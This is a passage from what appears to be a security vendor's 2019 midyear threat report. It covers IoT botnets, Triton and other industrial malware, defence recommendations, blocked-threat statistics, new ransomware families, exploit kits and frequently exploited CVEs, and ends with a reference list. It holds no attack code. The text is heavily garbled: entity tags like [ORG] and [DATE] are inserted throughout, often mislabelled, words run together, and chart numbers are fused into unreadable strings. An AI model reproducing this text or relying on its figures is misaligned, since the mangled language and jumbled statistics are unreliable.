Evasive Threats , [ORG] Pervasive [ORG] EffectsAnd as we predicted,135 the [ORG] IoT landscape had become a battleground of botnets and worms vying forcontrol over their infected devices . The players in these [ORG] IoT botnet and worm wars \u2014 including Bashlite136as well as several [ORG] Mirai variants,137,138 such as Omni,139 Hakai , and [PERSON] Yowai140 \u2014 had this routine in common : scanning the infected device for any competing malware or payload already in the device , deleting it , andembedding their own . Another trend we noted among some of these warring [ORG] IoT threats was that theyalso further monetized the zombified devices by illicitly turning them into cryptocurrency miners.141Other [ORG] IoT threats deviated from these clashes and instead made a mark on their own . In [DATE] May , for example , the [ORG] HiddenWasp malware was discovered being used as a [ORDINAL] second - stage targeted attack on alreadycompromised [DATE] systems.142 [DATE] And [DATE] a [DATE] month [DATE] later , [ORG] Silex was discovered , having managed to brick thousandsof [ORG] IoT devices and render them unusable unless their firmware was [ORG] reinstalled.143IoT security has become a major concern given the ubiquity of the [NORP] IoT across homes,144 [ORG] workplaces,145and entire industries146 \u2014 from food production147 and manufacturing148 to telecommunications149 andhealthcare.150 And the security risks to [ORG] IoT devices will persist as long as their users and manufacturerscontinue to forgo something as simple as changing or updating device credentials . Real - world attacks on critical infrastructures highlight importance of [GPE] IIoT securityThe [GPE] IIoT has transformed how industrial facilities and critical infrastructures operate.151 [ORG] Bringing [ORG] OT [ORG] andIT together has enabled enterprises to streamline , automate , and gain more visibility into their operations \u2014 so much so that the [GPE] IIoT market is poised to reach US$ 123 [MONEY] billion by 2021.152This convergence , however , can introduce security risks . [GPE] IIoT devices often spread across multiple facilities , share data across different regions , access data from readily shared infrastructures , and be managed byconsoles connected to the corporate network and even traditional IT systems . These intricacies canintroduce security gaps that threat actors are more than willing to exploit . In fact , according to a surveypublished in [DATE] March , 50 % of organizations already experienced an attack on their critical infrastructuresin [DATE] the [DATE] past [DATE] two [DATE] years.153A key example of [GPE] IIoT malware is [GPE] Triton , which was used against facilities in oil and gas industries in2017 . Also known as [ORG] Trisis , it can access and modify a facility \u2019s safety instrumented system ( SIS ) , whichacts as a countermeasure that puts systems undergoing operational problems into \u201c safe mode . \u201d If a [ORG] SISis tampered with , an attack can disrupt operations and even cause physical harm.154 In [DATE] April , the groupbehind [PERSON] Triton was discovered to have targeted another critical infrastructure [PERSON] facility.155 And in [DATE] June , thesame group , called [ORG] Xenotime , was seen probing the ICSs of power grids in the [GPE] U.S. and [LOC] Asia - Pacificregion.156Critical infrastructures use the [GPE] IIoT to ensure smooth and safe operations , which is why upholding itssecurity is of paramount importance \u2014 from implementing stringent patching policies , particularly inlegacy systems , to enforcing authentication and authorization mechanisms , and securing the channelstraversed by data between devices used in industrial facilities.15730 | [DATE] 2019 Midyear Security Roundup : Evasive Threats , Pervasive EffectsMultilayered defense helps address [DATE] today \u2019s multifaceted threatsThe notable threats seen in [DATE] the [DATE] first [DATE] half [DATE] of [DATE] 2019 were persistent , stealthy , and intent on taking advantage ofweaknesses in technologies , processes , and people . For threats that live off the land or introduce additional security risks , a multilayered or defense - in - depth approachcan help organizations thwart and mitigate them \u2014 from gateways , networks , and servers to endpoints . [NORP] Filelessthreats that abuse [ORG] PowerShell and use macro malware , for example , can be tackled through mechanismssuch as behavior monitoring , which blocks malware - associated routines ; sandboxing , which quarantinessuspicious scripts ; and intrusion detection and prevention systems , which can deter suspicious traffic likeC&C communication or data exfiltration . However , actively monitoring for even the subtlest anomalies or signsof malware infection in networks and endpoints , while also triaging alerts and patches , can overwhelm systemadministrators . To address this complication , enterprises can look into solutions that suitably combine humanexpertise and security technologies that can better detect , correlate , respond to , and remediate threats . Organizations moving toward digital transformation , especially those adopting [ORG] DevOps , are being driven tomigrate many of their operations into or incorporate their systems with newfangled technologies or some formof cloud infrastructure . This , though , can introduce security risks . Cloud infrastructures are dynamic by nature , and hardening their security can be an iteratively demanding task . This is compounded by the relative easewith which their underlying systems and networks can be accessed or modified when misconfiguration , littleor no authentication , and integration with legacy infrastructures are at play . Enterprises should therefore bakesecurity into the technologies , workflows , and development life cycles they use , or implement it as early aspossible in order to mitigate security and privacy risks down the line . Dealing with social engineering should also be an important part of organizations \u2019 cybersecurity strategies . Security solutions arrayed at the email gateway , such as machine learning - powered technologies that helpdetect suspicious content in emails , can significantly deter threats . But fostering a culture of cybersecurity , which includes increasing members \u2019 awareness of typical red flags in malicious emails and regularly conductingphishing simulations , helps just as much in combating malware and cybercriminals \u2019 attempts to steal [ORG] PII andmoney . Enterprises and individual users alike can also benefit from security technologies that can secure their devices , especially if they are used in \u201c bring your own device \u201d ( BYOD ) environments . They should as a matter ofcourse still follow basic security hygiene practices , such as enabling authentication features , strengtheningpasswords , securing routers , and not clicking links or downloading applications of dubious intent or value \u2014 ifa message , product , service , or proposition sounds too good ( or bad or urgent ) to be true , it most probably is.31 | [DATE] 2019 Midyear Security Roundup : Evasive Threats , Pervasive EffectsThreat Landscape in ReviewIn [DATE] the [DATE] first [DATE] half [DATE] of [DATE] 2019 , the [ORG] Trend [ORG] Micro [ORG] Smart [ORG] Protection [ORG] Network infrastructure was able to protect usersfrom [MONEY] more [MONEY] than [MONEY] 26.8 [MONEY] billion threats \u2014 a multitude of email , file , and URL threat components.26,804,076,261Overall threats blocked in [DATE] the [DATE] \ufb01rst [DATE] half of [CARDINAL] 201913,772,008,88412,468,147,0831,053,922,632249,939,16913,032,067,37711,843,263,413947,791,331241,012,633Email threats blockedMalicious \ufb01les blockedMalicious URLs blocked618,843,076,67419,763,701,518 [CARDINAL] 204,434,033,531394,645,341,625670,656,338,64618,967,636,870234,844,099,588416,844,602,188Q1Q2Q1Q20015B800BEmail reputation queriesFile reputation queriesURL reputation [DATE] queriesFigure [DATE] 18 . Email , file , and URL threats blocked decreased slightly in [DATE] the [DATE] second [DATE] quarter [DATE] of [DATE] the [DATE] year : Quarterly comparison of blocked email , file , and URL threats and ofemail , file , and URL reputation queries in [DATE] the [DATE] first [DATE] half [DATE] of [DATE] 201932 | 2019 Midyear Security Roundup : Evasive Threats , Pervasive EffectsCybercriminals and fraudsters continued to take advantage of the ubiquity of the [ORG] Android mobile platform . Based on data from [ORG] the [ORG] Trend [ORG] Micro [ORG] Mobile [ORG] App [ORG] Reputation [ORG] Service , the number of blocked maliciousAndroid apps , which included malicious apps and potentially unwanted applications ( PUAs ) , decreasedfrom [DATE] the [DATE] first [DATE] quarter [DATE] to [DATE] the [DATE] second [DATE] quarter [DATE] of [DATE] 2019 , but the overall number for [DATE] the [DATE] half - [DATE] year wasstill substantial . Q1Q2Q1Q20012,567,7488,030,699Malicious Android apps [PERSON] blocked15M7,532,234,6488,176,491,837Android app [DATE] queries10BFigure [DATE] 19 . [ORG] Android - based threats decreased in [DATE] the [DATE] second [DATE] quarter [DATE] of [DATE] the [DATE] year : Quarterly comparison of maliciousAndroid apps blocked and [ORG] Android app queries in [DATE] the [DATE] first [DATE] half [DATE] of [DATE] 2019 , based on data from [ORG] theTrend [ORG] Micro [ORG] Mobile [ORG] App [ORG] Reputation [ORG] ServiceDespite the decrease from [DATE] the [DATE] second [DATE] half [DATE] of [DATE] 2018 in the number of new ransomware families , the notableincidents in [DATE] the [DATE] first [DATE] half [DATE] of [DATE] 2019 suggested that ransomware would still be a staple in the threat landscape . [ORG] New [ORG] Ransomware FamiliesANATOVACLOPDOGOJOKERJUWONRABBITBIGBORBCORTEXFCRYPTLOCKERGOGARANNOHBITLOCKEDCRAZYCRYPTFREEZINGLOOCIPHERRAPIDTIONETREETUNCABLACKROUTER CRAZYZIPGOLDENAXEMAOLOAREDKEEPERVEGABLUEAGLECRYPONYGORGONMONGOLOCKROBBINHOODXCRYBONECRYPROTOHOLAPAPJSEEDLOCKERYATRONBROWECCRYPTGOJAMPERPHOBOSSEONYFISNIFFERCHATERCYMRANSOMJCRYPONYSODINOKIBITable [CARDINAL] 3 . [CARDINAL] 47 new ransomware families were seen : New ransomware families in [DATE] the [DATE] first [DATE] half [DATE] of [DATE] 201933 | [DATE] 2019 Midyear Security Roundup : Evasive Threats , Pervasive EffectsIn [DATE] the [DATE] first [DATE] half [DATE] of [DATE] 2019 , [ORG] PDF was the most used file type for spam email attachments in our dataset , barelyeclipsing [ORG] XLS ( [ORG] Microsoft [ORG] Excel ) , which was the most prevalent in [DATE] 2018.TOTAL13,921,066.PDF.XLS.DOCX.DOC.HTML.XLSX.EXE.RAR.SCR.PIFOthers26.8%26.5%17.9%10.6%5.5%4.4%3.4%1.8%0.6%0.4%2.1%Figure [DATE] 20 . [ORG] PDF barely overtook [ORG] XLS as the most common file type in spam email attachments : Distribution of file types used as attachments in spam emails in [DATE] the [DATE] first [DATE] half [DATE] of [DATE] 2019Amid an increase in activity , exploit kits still used exploits for old vulnerabilities to deliver their payloads , further reinforcing the need to keep systems regularly patched and updated . Exploit kitVulnerabilities exploitedRansomwaredeliveredBotnet malwaredeliveredMagnitudeRigGrandSoftGreenFlash SundownFalloutSpelevoCVE-2018 - 8174 ( Internet Explorer ) CVE-2018 - 4878 ( Adobe Flash Player ) CVE-2018 - 8174 CVE-2018 - 4878CVE-2018 - 15982 ( [ORG] Adobe [ORG] Flash [ORG] Player ) CVE-2018 - 4878 CVE-2018 - 15982 CVE-2018 - 8174 CVE-2018 - 4878 CVE-2018 - 15982 CVE-2018 - 8174 CVE-2018 - 4878CVE-2018 - 15982 CVE-2018 - 8174MagniberGandCrab Predator the Thief VidarTable 4 . Amid a stir in activity , exploit kits still banked on old vulnerabilities : Notable exploit kits in [DATE] thefirst [DATE] half [DATE] of [DATE] 2019 , the vulnerabilities they exploited , and the ransomware and botnet malware they delivered34 | [DATE] 2019 Midyear Security Roundup : Evasive Threats , Pervasive [ORG] EffectsThe prevalence of botnet malware in [DATE] the [DATE] first [DATE] half [DATE] of [DATE] 2019 was further exemplified by the 91 % increase inour detections of botnet connections from [DATE] the [DATE] first [DATE] quarter [DATE] to [DATE] the [DATE] second [DATE] quarter [DATE] of [DATE] the [DATE] year . Botnet - relatedactivities involved compromised and hijacked computers and devices , which connected to hacker - ownedC&C servers . Q1Q2Q1Q2009,21312,183Botnet [ORG] C&C servers503,739Botnet connections15K1M963,091Figure [CARDINAL] 21 . Botnet - related activities continued to have an upward trend : [DATE] Quarterly comparison of [ORG] C&C servers used by botnets and of botnet connections detected in [DATE] the [DATE] first [DATE] half [DATE] of [DATE] 2019Note : Botnet C&C servers were unique and active [ORG] C&C servers that endpoints queried or connected to , while botnet connections were unique endpoints that queried or connected to [ORG] C&C servers.35 | [DATE] 2019 Midyear Security Roundup : Evasive Threats , [ORG] Pervasive [ORG] EffectsAs in [DATE] last [DATE] year , the [ORG] Telnet default password login event was the most triggered event rule , based onfeedback from the Trend Micro Smart Home Network solution \u2014 further reflecting the ever - important needto change , update , and strengthen credentials . Also of note was the pervasiveness of EternalBlue- andWannaCry - related events \u2014 indicating that [ORG] the [ORG] Server [ORG] Message [ORG] Block ( SMB ) vulnerability exploited byEternalBlue and addressed by [ORG] Microsoft with its MS17 - 010 security bulletin was still a persistent securityrisk , exposing users to threats like [ORG] WannaCry . TOTAL672,484,970Telnet default password loginCryptocurrency miningMS17 - 010 - related ( [PRODUCT] EternalBlue , WannaCry)Brute - force login ( RDP , [ORG] SSH , [ORG] WEB , [ORG] FTP , [PERSON] SMB)Android Stagefright - relatedCVE-2018 - 12227 - related ( [ORG] Asterisk open source)GoAhead login.cgi information disclosure vulnerabilityRCE via shell scriptNetcore router backdoor accessSuspicious [NORP] IoT worm Telnet activityOthers44.3%19.4%12.3%9.3%3.2%1.8%1.1%1.0%1.0%1.0%5.6%Figure [CARDINAL] 22 . Telnet default password logins , cryptocurrency mining activities , and SMB vulnerability - exploiting attacks were still prevalent : Distribution of top inbound and outbound events in smart home networks in [DATE] the [DATE] first [DATE] half [DATE] of [DATE] 2019,based on feedback from the Trend Micro Smart Home Network solutionNote : Events were when rules were triggered for activities or behaviors from malicious , gray , and potentially unwanted applications , and were indicators that an attack might happen . Possible attacks were events closely related to threat activity.36 | 2019 Midyear Security Roundup : Evasive Threats , Pervasive EffectsFeedback from [ORG] the [ORG] Trend [ORG] Micro \u2122 [ORG] Deep [ORG] Security \u2122 and [ORG] Trend [ORG] Micro [ORG] TippingPoint \u00ae [ORG] Threat [ORG] ProtectionSystem solutions indicated that known ( n - day ) vulnerabilities were still significant security issues . Attacksthat exploited [ORG] SMB vulnerabilities that were also used by the notorious [PRODUCT] EternalBlue and [ORG] EternalChampionexploits were among the most prevalent . CVE-2009 - 1536 ( [ORG] Microsoft ASP.NET)CVE-2017 - 11815 ( [ORG] Microsoft Windows SMB Server SMBv1)CVE-2016 - 3714 ( ImageMagick)CVE-2017 - 0147 ( [ORG] Microsoft Windows SMB)CVE-2019 - 6443 ( NTPsec)CVE-2019 - 6445 ( NTPsec)CVE-2018 - 3191 ( Oracle WebLogic Server)GNU Bash remote code execution vulnerabilityCVE-2017 - 15275 ( Samba)CVE-2017 - 12611 ( [PRODUCT] Apache Struts)37,419,36816,074,01012,709,73110,537,1737,865,9834,955,0323,983,728866,003581,103552,015040MFigure 23 . Old vulnerabilities for which patches had long been issued continued to pose security risksto organizations : Distribution of the top filters triggered in [DATE] the [DATE] first [DATE] half [DATE] of [DATE] 2019,based on feedback from [ORG] the [ORG] Trend [ORG] Micro [ORG] Deep [ORG] Security solutionNote : Filters were triggered when intrusion attempts exploiting the corresponding vulnerabilities were blocked . Digium Asterisk SIP bu\ufb00er over\ufb02ow vulnerability CVE-2018 - 8414 ( [ORG] Microsoft Windows)CVE-2014 - 0224 ( OpenSSL)CVE-2009 - 2532 ( Windows SMBv2)8,710,1114,740,2124,429,178Windows Server CLDAP re\ufb02ection DDoS vulnerability1,353,065CVE-2017 - 5638 ( [LAW] Apache Struts)CVE-2015 - 8562 ( Joomla)CVE-2017 - 9805 ( Apche Struts 2)CVE-2014 - 6278 ( [LAW] GNU Bash)CVE-2014 - 0114 ( Apache Struts 2)869,289809,169570,855538,026508,886078,260,63480MFigure 24 . Intrusions or attacks that exploited old vulnerabilities for which patches had already been issued werestill rampant : Distribution of the top filters triggered in [DATE] the [DATE] first [DATE] half [DATE] of [DATE] 2019 , based on feedbackfrom [ORG] the [ORG] Trend [ORG] Micro [ORG] TippingPoint [ORG] Threat [ORG] Protection [ORG] System solutionNote : Filters were triggered when intrusion attempts exploiting the corresponding vulnerabilities were blocked.37 | [DATE] 2019 Midyear Security Roundup : Evasive Threats , Pervasive EffectsReferences1 [PERSON] Catalin [PERSON] Cimpanu . ( [DATE] 1 [DATE] June [DATE] 2019 ) . ZDNet . \u201c [PRODUCT] GandCrab ransomware operation says it \u2019s shutting down . \u201d Last accessed on [DATE] 24 [DATE] July [DATE] 2019 aturl [ORG] Micro . ( [DATE] 7 [DATE] September [DATE] 2016 ) . [ORG] Trend [ORG] Micro [ORG] Security [ORG] News . \u201c Ransomware as a Service Offered in the Deep Web : What This Means for Enterprises . \u201d Last accessed on [DATE] 24 [DATE] July [DATE] 2019 at url ransomware - as - a - service - what - this - means - for - enterprises.3 [PERSON] Patricia [PERSON] Mazzei . ( [DATE] 19 [DATE] June [DATE] 2019 ) . [ORG] The [ORG] New [ORG] York [ORG] Times . \u201c Hit by [PERSON] Ransomware [PERSON] Attack , [GPE] Florida [GPE] City [GPE] Agrees to Pay Hackers $ [MONEY] 600,000 . \u201d Last accessedon [DATE] 24 [DATE] July [DATE] 2019 at url [PERSON] Patricia [PERSON] Mazzei . ( [DATE] 27 [DATE] June [DATE] 2019 ) . [ORG] The [ORG] New [ORG] York [ORG] Times . \u201c [WORK_OF_ART] Another [WORK_OF_ART] Hacked [WORK_OF_ART] Florida [WORK_OF_ART] City [WORK_OF_ART] Pays [WORK_OF_ART] a [WORK_OF_ART] Ransom , This Time for $ [MONEY] 460,000 . \u201d Last accessed on24 [DATE] July [DATE] 2019 at url [ORG] Coveware . ( [DATE] 15 [DATE] July [DATE] 2019 ) . Coveware . \u201c [WORK_OF_ART] Ransomware [WORK_OF_ART] Amounts [WORK_OF_ART] Rise [WORK_OF_ART] 3x in [CARDINAL] Q2 as [ORG] Ryuk [ORG] & [ORG] Sodinokibi [ORG] Spread . \u201d Last accessed on [DATE] 24 [DATE] July [DATE] 2019 aturl [PERSON] Alexander [PERSON] Hanel . ( [DATE] 10 [DATE] January [DATE] 2019 ) . [PERSON] CrowdStrike [PERSON] Blog . \u201c Big Game Hunting with Ryuk : Another Lucrative Targeted Ransomware . \u201d Last accessedon [DATE] 24 [DATE] July [DATE] 2019 at url [ORG] Micro . ( [DATE] 20 [DATE] March [DATE] 2019 ) . [ORG] Trend [ORG] Micro [ORG] Security [ORG] News . \u201c What You Need to Know About the LockerGoga Ransomware . \u201d Last accessed on [DATE] 24 [DATE] July [DATE] 2019 at url [PERSON] Tidy . ( [DATE] 25 [DATE] June [DATE] 2019 ) . [ORG] BBC [ORG] News . \u201c How a ransomware attack cost [CARDINAL] one firm \u00a3 [MONEY] 45 m. \u201d Last accessed on [DATE] 1 [DATE] August [DATE] 2019 at url [WORK_OF_ART] Pound [WORK_OF_ART] Sterling [WORK_OF_ART] Live . ( n.d . ) . Pound Sterling Live . \u201c Historical Rates for the GBP / USD currency conversion on [DATE] 25 [DATE] June [DATE] 2019 ( 25/06/2019 ) . \u201d Last accessed on [DATE] 1 [DATE] August [DATE] 2019 at url on-2019 - 06 - 25.10 Manny Fernandez , [PERSON] David [PERSON] E. [PERSON] Sanger , and [LOC] Marina [LOC] Trahan [LOC] Martinez . ( [DATE] 22 [DATE] August [DATE] 2019 ) . [ORG] The [ORG] New [ORG] York [ORG] Times . \u201c Ransomware Attacks Are TestingResolve of Cities Across America . \u201d Last accessed on [DATE] 23 [DATE] August [DATE] 2019 at url [PERSON] Doug [PERSON] Olenick . ( [DATE] 26 [DATE] April [DATE] 2019 ) . [ORG] SC [ORG] Media . \u201c Greenville in recovery phase from [ORG] Robbinhood ransomware attack . \u201d Last accessed on [DATE] 13 [DATE] August [DATE] 2019 at url [PERSON] Janus [PERSON] Agcaoili and [PERSON] Miguel [PERSON] Ang . ( [DATE] 6 [DATE] June [DATE] 2019 ) . [ORG] Trend [ORG] Micro [ORG] Security [ORG] News . \u201c [WORK_OF_ART] Narrowed [WORK_OF_ART] Sights , Bigger Payoffs : Ransomware in [DATE] 2019 . \u201d Last accessed on [DATE] 2 [DATE] August [DATE] 2019 at url payoffs - ransomware - in-2019.13 [PERSON] Lawrence [PERSON] Abrams . ( [DATE] 5 [DATE] March [DATE] 2019 ) . BleepingComputer . \u201c [WORK_OF_ART] CryptoMix [WORK_OF_ART] Clop [WORK_OF_ART] Ransomware Says It \u2019s [PERSON] Targeting [PERSON] Networks , Not Computers . \u201d Lastaccessed on [DATE] 24 [DATE] July [DATE] 2019 at url computers/.14 [PERSON] Raphael [PERSON] Centeno . ( [DATE] 8 [DATE] May [DATE] 2019 ) . [ORG] TrendLabs [ORG] Security [PERSON] Intelligence [PERSON] Blog . \u201c [WORK_OF_ART] Dharma [WORK_OF_ART] Ransomware [WORK_OF_ART] Uses [WORK_OF_ART] AV [WORK_OF_ART] Tool [WORK_OF_ART] to [WORK_OF_ART] Distract from Malicious Activities . \u201dLast accessed on [DATE] 24 [DATE] July [DATE] 2019 at url from - malicious - activities/.15 Trend Micro . ( [DATE] 9 [DATE] May [DATE] 2019 ) . [ORG] Trend [ORG] Micro [ORG] Security [ORG] News . \u201c Ransomware Recap : Still in [GPE] Development , [GPE] Found in the Wild . \u201d Last accessed on [CARDINAL] 24 July2019 at url the - wild/.16 [PERSON] Jon [PERSON] Oliver . ( [DATE] 19 [DATE] September [DATE] 2016 ) . [ORG] TrendLabs [ORG] Security [PERSON] Intelligence [PERSON] Blog . \u201c [WORK_OF_ART] A [WORK_OF_ART] Show [WORK_OF_ART] of ( Brute ) Force : [WORK_OF_ART] Crysis [WORK_OF_ART] Ransomware Found Targeting [NORP] Australian and [GPE] New [GPE] Zealand [GPE] Businesses . \u201d Last accessed on [DATE] 1 [DATE] August [DATE] 2019 at url businesses - in - australia - new - zealand - via - brute - forced - rdps/.17 Trend Micro . ( [DATE] 18 [DATE] April [DATE] 2019 ) . [ORG] Trend [ORG] Micro [ORG] Security [ORG] News . \u201c [PERSON] NamPoHyu aka MegaLocker Virus Ransomware Found Remotely Encrypting SambaServers . \u201d Last accessed on [DATE] 2 [DATE] August [DATE] 2019 at url aka - megalocker - virus - ransomware - found - remotely - encrypting - samba - servers.38 | [DATE] 2019 Midyear Security Roundup : Evasive Threats , [ORG] Pervasive [ORG] Effects18 [ORG] Trend [ORG] Micro . ( [DATE] 27 [DATE] May [DATE] 2019 ) . [ORG] Trend [ORG] Micro [ORG] Security [ORG] News . \u201c GandCrab Ransomware [PERSON] Found [PERSON] Targeting MySQL Databases . \u201d Last accessed on [DATE] 24July [DATE] 2019 at url databases/.19 [PERSON] Augusto [PERSON] Remillano [PERSON] II and [PERSON] Robert [PERSON] Malagad . ( [DATE] 7 [DATE] May [DATE] 2019 ) . [ORG] TrendLabs [ORG] Security [PERSON] Intelligence [PERSON] Blog . \u201c CVE-2019 - 3396 Redux : Confluence VulnerabilityExploited to Deliver Cryptocurrency Miner With Rootkit . \u201d Last accessed on [DATE] 24 [DATE] July [DATE] 2019 at url intelligence / cve-2019 - 3396 - redux - confluence - vulnerability - exploited - to - deliver - cryptocurrency - miner - with - rootkit/.20 [PERSON] Lawrence [PERSON] Abrams . ( [DATE] 11 [DATE] September [DATE] 2018 ) . BleepingComputer . \u201c [WORK_OF_ART] Mongo [WORK_OF_ART] Lock [WORK_OF_ART] Attack [WORK_OF_ART] Ransoming [WORK_OF_ART] Deleted [WORK_OF_ART] MongoDB [WORK_OF_ART] Databases . \u201d Last accessed on2 [DATE] August [DATE] 2019 at url [ORG] Trend [ORG] Micro . ( [DATE] 8 [DATE] January [DATE] 2019 ) . [ORG] Trend [ORG] Micro [ORG] Security [ORG] News . \u201c Ransomware MongoLock Immediately Deletes Files , Formats Backup Drives . \u201d Lastaccessed on [DATE] 2 [DATE] August [DATE] 2019 at url immediately - deletes - files - formats - backup - drives/.22 Buddy Tancio , [PERSON] Ryan [PERSON] Maglaque , [PERSON] Cenen [PERSON] Enalbes , and [PERSON] Jay [PERSON] Yaneza . ( [DATE] 14 [DATE] March [DATE] 2019 ) . [ORG] Trend [ORG] Micro [ORG] Security [ORG] News . \u201c Examining Ryuk RansomwareThrough the Lens of Managed Detection and [ORG] Response . \u201d Last accessed on [DATE] 2 [DATE] August [DATE] 2019 at url news / cybercrime - and - digital - threats / examining - ryuk - ransomware - through - the - lens - of - managed - detection - and - response/.23 Trend Micro . ( [DATE] 21 [DATE] May [DATE] 2019 ) . [ORG] Trend [ORG] Micro [ORG] Security [ORG] News . \u201c [WORK_OF_ART] Ryuk [WORK_OF_ART] Ransomware [WORK_OF_ART] Shows [WORK_OF_ART] Diversity in [GPE] Targets , Consistency in Higher Payouts . \u201d Lastaccessed on [DATE] 24 [DATE] July [DATE] 2019 at url diversity - in - targets - consistency - in - higher - payouts/.24 [PERSON] Alexander [PERSON] Hanel . ( [DATE] 10 [DATE] January [DATE] 2019 ) . [PERSON] CrowdStrike [PERSON] Blog . \u201c Big Game Hunting with Ryuk : Another Lucrative Targeted Ransomware . \u201d Last accessedon [DATE] 24 [DATE] July [DATE] 2019 at url [ORG] Trend [ORG] Micro . ( [DATE] 20 [DATE] March [DATE] 2019 ) . [ORG] Trend [ORG] Micro [ORG] Security [ORG] News . \u201c What You Need to Know About the LockerGoga Ransomware . \u201d Last accessed on [DATE] 24July [DATE] 2019 at url [PERSON] Kevin [PERSON] Beaumont . ( [DATE] 22 [DATE] March [DATE] 2019 ) . Double Pulsar . \u201c How Lockergoga took down [ORG] Hydro \u2014 ransomware used in targeted attacks aimed at bigbusiness . \u201d Last accessed on [DATE] 2 [DATE] August [DATE] 2019 at url attacks - aimed - at - big - business - c666551f5880.27 [PERSON] Erika [PERSON] Mendoza , [PERSON] Jay [PERSON] Yaneza , [PERSON] Gilbert [PERSON] Sison , [PERSON] Anjali [PERSON] Patil , [PERSON] Julie [PERSON] Cabuhat , and [PERSON] Joelson [PERSON] Soares . ( [DATE] 29 [DATE] March [DATE] 2019 ) . [ORG] TrendLabs [ORG] Security [ORG] IntelligenceBlog . \u201c [WORK_OF_ART] Emotet - Distributed [WORK_OF_ART] Ransomware [WORK_OF_ART] Loader for [PERSON] Nozelesn [PERSON] Found via [ORG] Managed [ORG] Detection and [ORG] Response . \u201d Last accessed on [DATE] 24 [DATE] July [DATE] 2019 at url and - response/.28 [PERSON] Lawrence [PERSON] Abrams . ( [DATE] 26 [DATE] April [DATE] 2019 ) . BleepingComputer . \u201c [WORK_OF_ART] A [WORK_OF_ART] Closer [WORK_OF_ART] Look at the RobbinHood Ransomware . \u201d Last accessed on [DATE] 24 [DATE] July [DATE] 2019 aturl [PERSON] Gilbert [PERSON] Sison and [PERSON] Ryan [PERSON] Maglaque . ( [DATE] 15 [DATE] April [DATE] 2019 ) . [ORG] TrendLabs [ORG] Security [PERSON] Intelligence [PERSON] Blog . \u201c [WORK_OF_ART] Account [WORK_OF_ART] With [WORK_OF_ART] Admin [WORK_OF_ART] Privileges [WORK_OF_ART] Abused [WORK_OF_ART] to [WORK_OF_ART] InstallBitPaymer [WORK_OF_ART] Ransomware via [ORG] PsExec . \u201d Last accessed on [DATE] 2 [DATE] August [DATE] 2019 at url with - admin - privileges - abused - to - install - bitpaymer - ransomware - via - psexec/.30 NJCCIC . ( [DATE] 29 [DATE] August [DATE] 2017 ) . NJCCIC . \u201c [PERSON] Bit [PERSON] Paymer . \u201d Last accessed on [DATE] 24 [DATE] July [DATE] 2019 at url [PERSON] Arnold [PERSON] Osipov . ( [DATE] 18 [DATE] July [DATE] 2019 ) . [PERSON] Morphisec . \u201c Bitpaymer Ransomware Leveraging New Custom Packer Framework Against Targets Across theU.S. \u201d Last accessed on [DATE] 24 [DATE] July [DATE] 2019 at url Threat Team . ( [DATE] 13 [DATE] August [DATE] 2018 ) . [ORG] BluVector . \u201c [WORK_OF_ART] BitPaymer [WORK_OF_ART] Ransomware [WORK_OF_ART] Freezes the [ORG] PGA and an [NORP] Alaskan Town . \u201d Last accessed on [DATE] 24 [DATE] July [DATE] 2019 aturl [ORG] Trend [ORG] Micro . ( [DATE] 7 [DATE] May [DATE] 2019 ) . [ORG] Trend [ORG] Micro [ORG] Security [ORG] News . \u201c MegaCortex Ransomware Spotted Attacking Enterprise Networks . \u201d Last accessed on24 [DATE] July [DATE] 2019 at url enterprise - [ORG] networks/.34 [ORG] Trend [ORG] Micro . ( [DATE] 12 [DATE] May [DATE] 2017 ) . [ORG] TrendLabs [ORG] Security [PERSON] Intelligence [PERSON] Blog . \u201c Massive [ORG] WannaCry / Wcry Ransomware Attack Hits Various Countries . \u201d Lastaccessed on [DATE] 24 [DATE] July [DATE] 2019 at url various - countries/.35 Microsoft . ( [DATE] 3 [DATE] August [DATE] 2019 ) . Windows Help . \u201c Windows [CARDINAL] 7 support will end on [DATE] January [DATE] 14 , [DATE] 2020 . \u201d Last accessed on [DATE] 1 [DATE] August [DATE] 2019 aturl [PERSON] Lawrence [PERSON] Abrams . ( [DATE] 24 [DATE] June [DATE] 2019 ) . BleepingComputer . \u201c [WORK_OF_ART] Sodinokibi [WORK_OF_ART] Ransomware [WORK_OF_ART] Now [WORK_OF_ART] Pushed by [PERSON] Exploit [PERSON] Kits and Malvertising . \u201d Last accessedon [DATE] 24 [DATE] July [DATE] 2019 at [PERSON] url [PERSON] Brian [PERSON] Krebs . ( [DATE] 15 [DATE] July [DATE] 2019 ) . [ORG] Krebs [ORG] on [ORG] Security . \u201c Is \u2018 REvil \u2019 [ORG] the [ORG] New [ORG] GandCrab Ransomware ? \u201d Last accessed on [DATE] 24 [DATE] July [DATE] 2019 aturl [ORG] Trend [ORG] Micro [ORG] Research . ( [DATE] 2018 ) . [ORG] Trend [ORG] Micro . \u201c [WORK_OF_ART] Mapping [WORK_OF_ART] the Future : [WORK_OF_ART] Dealing [WORK_OF_ART] With [WORK_OF_ART] Pervasive [WORK_OF_ART] and [WORK_OF_ART] Persistent [WORK_OF_ART] Threats . \u201d Last accessed on [CARDINAL] 24 July2019 at url [ORG] Trend [ORG] Micro . ( [DATE] 29 [DATE] July [DATE] 2019 ) . [ORG] Trend [ORG] Micro [ORG] Security [ORG] News . \u201c Risks Under the [PRODUCT] Radar : Understanding Fileless Threats . \u201d Last accessed on [CARDINAL] 2 August2019 at url | [DATE] 2019 Midyear Security Roundup : Evasive Threats , Pervasive Effects40 [PERSON] Hiroyuki [PERSON] Kakara and [PERSON] Kazuki [PERSON] Fujisawa . ( [DATE] 17 [DATE] April [DATE] 2019 ) . [ORG] TrendLabs [ORG] Security [PERSON] Intelligence [PERSON] Blog . \u201c [WORK_OF_ART] Potential [WORK_OF_ART] Targeted [WORK_OF_ART] Attack [WORK_OF_ART] Uses AutoHotkey andMalicious Script Embedded in [ORG] Excel [ORG] File [ORG] to [ORG] Avoid [ORG] Detection . \u201d Last accessed on [DATE] 24 [DATE] July [DATE] 2019 at url intelligence / potential - targeted - attack - uses - autohotkey - and - malicious - script - embedded - in - excel - file - to - avoid - detection/.41 [PERSON] Augusto [PERSON] Remillano [PERSON] II and [PERSON] Arvin [PERSON] Macaraeg . ( [DATE] 12 [DATE] April [DATE] 2019 ) . [ORG] TrendLabs [ORG] Security [PERSON] Intelligence [PERSON] Blog . \u201c Miner [PERSON] Malware [PERSON] Spreads Beyond [GPE] China , [ORG] UsesMultiple [ORG] Propagation [ORG] Methods [ORG] Including [ORG] EternalBlue , [PERSON] Powershell [PERSON] Abuse . \u201d Last accessed on [DATE] 2 [DATE] August [DATE] 2019 at url trendlabs - security - intelligence / miner - malware - spreads - beyond - china - uses - multiple - 